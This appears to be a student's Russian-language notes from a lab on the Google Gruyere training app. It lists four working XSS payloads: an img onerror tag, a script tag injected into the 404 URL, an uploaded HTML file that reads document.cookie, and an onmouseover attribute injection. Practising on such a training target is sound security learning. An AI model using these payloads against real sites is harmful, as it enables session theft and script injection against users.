# Payloads для gruyere

## Payload 1

В private snippet можно написать, он выведет сходу команду при попадании на главную страницу. 
```
<img src=x onerror="console.log('Y0UV3 833N H4CK3D')";>
```

## Payload 2

На странице 404 если прописать в урл js код то он сходу выведется.
```
https://google-gruyere.appspot.com/385132000834657455499844343074218974091/%3Cscript%3Etype=%22text/javascript%22%3Ealert(1);%3C/script%3E
```

## Payload 3

Можно загрузить файл .html файл с любым вредоносным кодом внутри, тут например можно получить куки пользователя. Он откроется прямо на сайте по ссылке https://google-gruyere.appspot.com/385132000834657455499844343074218974091/gleb/index.html и соотвественно увидит данные пользователя.

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <img src=x onerror="console.log(document.cookie)">
</body>
</html>
```

## Payload 4

Если закинуть в код изменения цвета закрытие кавычек (соответсвенно закрыть тег style) то можно закинуть новый атрибут для span в который можно закинуть js код

```
' onmouseover=alert('XSS'); '
```